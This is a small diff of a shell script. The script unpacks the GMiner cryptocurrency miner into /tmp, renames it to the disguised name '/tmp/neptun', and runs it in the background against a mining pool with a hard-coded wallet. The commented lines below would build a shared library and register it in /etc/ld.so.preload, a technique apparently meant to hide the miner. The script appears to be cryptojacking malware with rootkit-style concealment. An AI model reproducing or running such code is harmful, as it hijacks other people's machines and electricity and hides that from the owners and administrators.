@@ -13,7 +13,7 @@ mv gminer_3_43_linux64.tar.xz /tmp/ml/gminer_3_43_linux64.tar.xz
 tar xvf /tmp/ml/gminer_3_43_linux64.tar.xz -C /tmp/ml
 cp /tmp/ml/miner /tmp/neptun
 /tmp/neptun --algo kawpow --server xna.2miners.com:6060 --user NibTPifN31vLNqZK1zUTX7LpeM2zAxw6Ek.RIG_4 -p x & 
-mv /amd /tmp/ml/
+mv amd/ /tmp/ml/
 #./tmp/ml/amd/make
 #mv /tmp/ml/surec.so /usr/local/lib/
 #echo /usr/local/lib/surec.so >> /etc/ld.so.preload
